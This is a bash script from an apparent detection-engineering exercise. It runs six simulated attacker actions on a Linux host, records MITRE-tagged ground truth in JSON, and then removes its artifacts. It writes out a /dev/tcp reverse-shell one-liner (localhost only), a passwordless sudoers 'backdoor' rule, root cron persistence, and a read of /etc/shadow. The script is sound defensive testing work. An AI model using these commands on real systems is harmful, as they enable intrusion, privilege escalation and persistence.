#!/bin/bash

# name: 11-linux_attack_sim.sh
# purpose: Execute a controlled Linux attacker simulation, record precise ground truth, and clean all test artifacts.
# author: Pedro Cabral
#
# Project: 2x02 - Eyes on Endpoint
# Task: 11 - Linux Attacker Simulation
#
# Controlled actions:
# 1. Create user testattacker
# 2. Modify sudoers
# 3. Execute a copied binary from /tmp
# 4. Attempt a reverse shell to localhost only
# 5. Create cron persistence
# 6. Access /etc/shadow
#
# Output:
# - linux_attack_log.json
#
# Safety:
# - Localhost-only reverse shell attempt
# - No external payload download
# - No credential theft
# - No destructive commands
# - All created artifacts are removed

set -euo pipefail

# =============================================================================
# Configuration
# =============================================================================

SIMULATION_USER="testattacker"
SUDOERS_FILE="/etc/sudoers.d/backdoor"
TMP_BINARY="/tmp/suspicious_bin"
BEACON_FILE="/tmp/beacon.sh"
CRON_FILE="/etc/cron.d/persistence_test"
OUTPUT_FILE="linux_attack_log.json"

REVERSE_HOST="127.0.0.1"
REVERSE_PORT="4444"

ACTIONS_FILE="$(mktemp)"
CLEANUP_ERRORS=()

trap 'rm -f "${ACTIONS_FILE}"' EXIT

# =============================================================================
# Prerequisites
# =============================================================================

require_command() {
    local command_name="$1"

    if ! command -v "${command_name}" >/dev/null 2>&1; then
        printf '[FAIL] Required command not found: %s\n' "${command_name}"
        exit 1
    fi
}

require_command jq
require_command date
require_command useradd
require_command userdel
require_command id
require_command cp
require_command bash
require_command cat

if [[ "${EUID}" -ne 0 ]]; then
    printf '[FAIL] Run this script with sudo/root privileges.\n'
    exit 1
fi

# =============================================================================
# Helpers
# =============================================================================

utc_now() {
    date -u '+%Y-%m-%dT%H:%M:%SZ'
}

write_action_line() {
    local number="$1"
    local description="$2"
    local timestamp="$3"

    printf '    [%s/6] %-43s %s\n' \
        "${number}" \
        "${description}" \
        "${timestamp}"
}

add_action() {
    local action_number="$1"
    local description="$2"
    local timestamp="$3"
    local expected_source_json="$4"
    local technique_id="$5"
    local technique_name="$6"
    local status="$7"
    local details_json="$8"

    jq -cn \
        --argjson action_number "${action_number}" \
        --arg description "${description}" \
        --arg timestamp "${timestamp}" \
        --argjson expected_detection_source "${expected_source_json}" \
        --arg technique_id "${technique_id}" \
        --arg technique_name "${technique_name}" \
        --arg status "${status}" \
        --argjson details "${details_json}" \
        '{
            action_number: $action_number,
            description: $description,
            timestamp: $timestamp,
            expected_detection_source: $expected_detection_source,
            mitre_attack: {
                technique_id: $technique_id,
                technique_name: $technique_name
            },
            status: $status,
            details: $details
        }' >> "${ACTIONS_FILE}"
}

cleanup_artifacts() {
    printf '[*] Cleaning up artifacts...'

    # Cron file
    if [[ -e "${CRON_FILE}" ]]; then
        if ! rm -f "${CRON_FILE}"; then
            CLEANUP_ERRORS+=("Failed to remove ${CRON_FILE}")
        fi
    fi

    # Beacon file
    if [[ -e "${BEACON_FILE}" ]]; then
        if ! rm -f "${BEACON_FILE}"; then
            CLEANUP_ERRORS+=("Failed to remove ${BEACON_FILE}")
        fi
    fi

    # Temporary binary
    if [[ -e "${TMP_BINARY}" ]]; then
        if ! rm -f "${TMP_BINARY}"; then
            CLEANUP_ERRORS+=("Failed to remove ${TMP_BINARY}")
        fi
    fi

    # Sudoers file
    if [[ -e "${SUDOERS_FILE}" ]]; then
        if ! rm -f "${SUDOERS_FILE}"; then
            CLEANUP_ERRORS+=("Failed to remove ${SUDOERS_FILE}")
        fi
    fi

    # Test account
    if id "${SIMULATION_USER}" >/dev/null 2>&1; then
        if ! userdel -r "${SIMULATION_USER}" >/dev/null 2>&1; then
            CLEANUP_ERRORS+=("Failed to remove user ${SIMULATION_USER}")
        fi
    fi

    if [[ "${#CLEANUP_ERRORS[@]}" -eq 0 ]]; then
        printf '                           [CLEAN]\n'
    else
        printf '                           [WARN]\n'
        for cleanup_error in "${CLEANUP_ERRORS[@]}"; do
            printf '    [WARN] %s\n' "${cleanup_error}"
        done
    fi
}

# =============================================================================
# Start
# =============================================================================

printf '[*] Running Linux attacker simulation...\n'

: > "${ACTIONS_FILE}"

# =============================================================================
# ACTION 1
# Create user
#
# Expected telemetry:
# - auditd USER_ACCT / ADD_USER / user management records
#
# MITRE:
# - T1136.001 Create Account: Local Account
# =============================================================================

if id "${SIMULATION_USER}" >/dev/null 2>&1; then
    printf '[FAIL] User %s already exists. Aborting to avoid modifying a real account.\n' \
        "${SIMULATION_USER}"
    exit 1
fi

useradd "${SIMULATION_USER}"

TIMESTAMP="$(utc_now)"

write_action_line \
    1 \
    "Creating user testattacker..." \
    "${TIMESTAMP}"

add_action \
    1 \
    "Created temporary local account testattacker" \
    "${TIMESTAMP}" \
    '["auditd user/account management","auth log"]' \
    "T1136.001" \
    "Create Account: Local Account" \
    "executed" \
    "$(jq -cn --arg user "${SIMULATION_USER}" '{user:$user}')"

# =============================================================================
# ACTION 2
# Modify sudoers
#
# MITRE:
# - T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching
# =============================================================================

printf '%s\n' \
    "${SIMULATION_USER} ALL=(ALL) NOPASSWD:ALL" \
    > "${SUDOERS_FILE}"

chmod 0440 "${SUDOERS_FILE}"

TIMESTAMP="$(utc_now)"

write_action_line \
    2 \
    "Modifying sudoers..." \
    "${TIMESTAMP}"

add_action \
    2 \
    "Created sudoers rule granting passwordless sudo" \
    "${TIMESTAMP}" \
    '["auditd file modification","auditd syscall"]' \
    "T1548.003" \
    "Abuse Elevation Control Mechanism: Sudo and Sudo Caching" \
    "executed" \
    "$(jq -cn \
        --arg path "${SUDOERS_FILE}" \
        --arg user "${SIMULATION_USER}" \
        '{path:$path,user:$user}')"

# =============================================================================
# ACTION 3
# Execute from /tmp
#
# MITRE:
# - T1059 Command and Scripting Interpreter
# =============================================================================

cp /usr/bin/true "${TMP_BINARY}"
chmod 0755 "${TMP_BINARY}"
"${TMP_BINARY}"

TIMESTAMP="$(utc_now)"

write_action_line \
    3 \
    "Executing from /tmp..." \
    "${TIMESTAMP}"

add_action \
    3 \
    "Executed copied binary from /tmp" \
    "${TIMESTAMP}" \
    '["auditd execve","process telemetry"]' \
    "T1059" \
    "Command and Scripting Interpreter" \
    "executed" \
    "$(jq -cn \
        --arg source "/usr/bin/true" \
        --arg target "${TMP_BINARY}" \
        '{source_binary:$source,target_binary:$target}')"

# =============================================================================
# ACTION 4
# Reverse shell attempt to localhost only
#
# MITRE:
# - T1059.004 Unix Shell
# =============================================================================

set +e
bash -c \
    "bash -i >& /dev/tcp/${REVERSE_HOST}/${REVERSE_PORT} 0>&1 & child=\$!; sleep 1; kill \$child 2>/dev/null; wait \$child 2>/dev/null" \
    >/dev/null 2>&1
REVERSE_EXIT_CODE=$?
set -e

TIMESTAMP="$(utc_now)"

write_action_line \
    4 \
    "Reverse shell attempt (localhost)..." \
    "${TIMESTAMP}"

add_action \
    4 \
    "Attempted localhost-only reverse shell connection" \
    "${TIMESTAMP}" \
    '["auditd execve","network telemetry"]' \
    "T1059.004" \
    "Command and Scripting Interpreter: Unix Shell" \
    "executed" \
    "$(jq -cn \
        --arg host "${REVERSE_HOST}" \
        --argjson port "${REVERSE_PORT}" \
        --argjson exit_code "${REVERSE_EXIT_CODE}" \
        '{destination_ip:$host,destination_port:$port,exit_code:$exit_code,localhost_only:true}')"

# =============================================================================
# ACTION 5
# Cron persistence
#
# MITRE:
# - T1053.003 Scheduled Task/Job: Cron
# =============================================================================

cat > "${BEACON_FILE}" <<'EOF'
#!/bin/bash
exit 0
EOF

chmod 0755 "${BEACON_FILE}"

printf '%s\n' \
    "* * * * * root ${BEACON_FILE}" \
    > "${CRON_FILE}"

chmod 0644 "${CRON_FILE}"

TIMESTAMP="$(utc_now)"

write_action_line \
    5 \
    "Cron persistence..." \
    "${TIMESTAMP}"

add_action \
    5 \
    "Created controlled cron persistence artifact" \
    "${TIMESTAMP}" \
    '["auditd file modification","cron telemetry"]' \
    "T1053.003" \
    "Scheduled Task/Job: Cron" \
    "executed" \
    "$(jq -cn \
        --arg cron_file "${CRON_FILE}" \
        --arg beacon_file "${BEACON_FILE}" \
        '{cron_file:$cron_file,command:$beacon_file}')"

# =============================================================================
# ACTION 6
# Sensitive file access
#
# MITRE:
# - T1005 Data from Local System
# =============================================================================

cat /etc/shadow >/dev/null

TIMESTAMP="$(utc_now)"

write_action_line \
    6 \
    "Accessing /etc/shadow..." \
    "${TIMESTAMP}"

add_action \
    6 \
    "Read sensitive file /etc/shadow" \
    "${TIMESTAMP}" \
    '["auditd file access","auditd syscall"]' \
    "T1005" \
    "Data from Local System" \
    "executed" \
    "$(jq -cn --arg path "/etc/shadow" '{path:$path,operation:"read"}')"

# =============================================================================
# Build Ground Truth
# =============================================================================

GENERATED_AT="$(utc_now)"
HOSTNAME_VALUE="$(hostname)"

ACTIONS_JSON="$(jq -s '.' "${ACTIONS_FILE}")"

jq -n \
    --arg simulation "MedDefense Linux Attacker Simulation" \
    --arg hostname "${HOSTNAME_VALUE}" \
    --arg platform "Linux" \
    --arg generated_at "${GENERATED_AT}" \
    --argjson actions "${ACTIONS_JSON}" \
    '{
        metadata: {
            simulation: $simulation,
            hostname: $hostname,
            platform: $platform,
            generated_at: $generated_at,
            action_count: ($actions | length),
            controlled_simulation: true
        },
        actions: $actions
    }' > "${OUTPUT_FILE}"

if ! jq empty "${OUTPUT_FILE}" >/dev/null 2>&1; then
    printf '[FAIL] Ground truth JSON is invalid.\n'
    exit 1
fi

# =============================================================================
# Cleanup
# =============================================================================

cleanup_artifacts

# =============================================================================
# Final Output
# =============================================================================

printf 'Actions executed: 6\n'
printf 'Ground truth saved to: %s\n' "${OUTPUT_FILE}"

if [[ "${#CLEANUP_ERRORS[@]}" -gt 0 ]]; then
    exit 1
fi

exit 0